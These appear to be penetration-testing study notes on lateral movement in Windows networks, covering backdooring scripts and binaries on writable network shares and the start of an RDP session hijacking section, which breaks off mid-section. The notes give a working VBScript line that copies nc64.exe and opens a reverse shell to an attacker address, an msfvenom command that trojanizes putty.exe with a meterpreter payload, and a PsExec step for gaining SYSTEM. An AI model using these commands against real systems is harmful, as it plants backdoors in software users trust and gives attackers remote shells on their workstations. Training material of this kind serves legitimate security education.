It is quite common to find network shares that legitimate users use to perform day-to-day tasks when checking corporate environments. If those shares are writable for some reason, an attacker can plant specific files to force users into executing any arbitrary payload and gain access to their machines.

One common scenario consists of *finding a shortcut to a script or executable file hosted on a network share.*
![](Pasted%20image%2020241118170136.png)

The rationale behind this is that the *administrator can maintain an executable on a network share, and users can execute it without copying or installing the application* to each user's machine. If we, as attackers, have write permissions over such scripts or executables, we can backdoor them to force users to execute any payload we want.

Although the script or executable is hosted on a server, when a user opens the shortcut on his workstation, the executable will be copied from the server to its `%temp%` folder and executed on the workstation. Therefore any payload will run in the context of the final user's workstation (and logged-in user account).

## Backdooring .vbs Scripts
As an example, if the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script. This will copy nc64.exe from the share to the user's workstation `%tmp%` directory and send a reverse shell back to the attacker whenever a user opens the shared VBS script.

```shell-session
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe {attacker_ip} {1234}", 0, True
```

1. `CreateObject("WScript.Shell")`
	- This is a **VBScript** command that creates an instance of the **WScript.Shell** object.
	- The `WScript.Shell` object allows the execution of system commands and provides access to system-level functions.

2. `.Run "cmd.exe /c ...", 0, True`
	- The `.Run` method executes the command specified in quotes.
	- **`cmd.exe /c`** runs the command specified after it and then terminates the shell.
	- The arguments here:
	    - `"cmd.exe /c ..."`: The command to run.
	    - `0`: Hides the window (runs the process in the background).
	    - `True`: The script waits for the command to finish before continuing.

3. `"copy /Y \\10.10.28.6\myshare\nc64.exe %tmp%"`
	- This part uses the `copy` command to copy a file from a network share to the local system.
	- **`\\10.10.28.6\myshare\nc64.exe`**:
	    - This is the path to the **Netcat executable** (`nc64.exe`), hosted on a network share (`myshare`) on the machine with IP `10.10.28.6`.
	- **`%tmp%`**:
	    - This is an environment variable in Windows pointing to the user's temporary directory (e.g., `C:\Users\<User>\AppData\Local\Temp`).
	- **`/Y`**:
	    - This switch forces the copy operation to overwrite the file if it already exists, without prompting the user.

 4. `& %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234`
	- The `&` symbol is used to chain commands in Windows Command Prompt.
	- **`%tmp%\nc64.exe`**:
	    - This runs the copied Netcat executable from the temporary folder.
	- **`-e cmd.exe`**:
	    - The `-e` switch in Netcat specifies a program to execute after establishing a connection. Here, it's launching `cmd.exe`, effectively creating a shell session.
	- **`<attacker_ip> 1234`**:
	    - This specifies the target IP address (`<attacker_ip>`) and port (`1234`) to which Netcat will connect. The attacker’s IP address should replace `<attacker_ip>`.

## Backdooring .exe Files
If the shared file is a Windows binary, say putty.exe, you can download it from the share and use msfvenom to inject a backdoor into it. The binary will still work as usual but execute an additional payload silently. To create a backdoored putty.exe, we can use the following command:
```shell-session
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. Once the file has been generated, we can *replace the executable on the windows share and wait for any connections using the exploit/multi/handler module from Metasploit*.

## RDP hijacking
When an administrator uses *Remote Desktop to connect to a machine and closes the RDP client instead of logging off, his session will remain open on the server indefinitely*. If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.

If we have administrator-level access, we can get SYSTEM by any method of our preference. For now, we will be using psexec to do so. First, let's *run a cmd.exe as administrator*:
	![](Pasted%20image%2020241118173354.png)
From there, run `PsExec64.exe`(available at `C:\tools\`):
```shell-session
PsExec64.exe -s cmd.exe
```

To list the existing sessions on a server, you can use the following command:
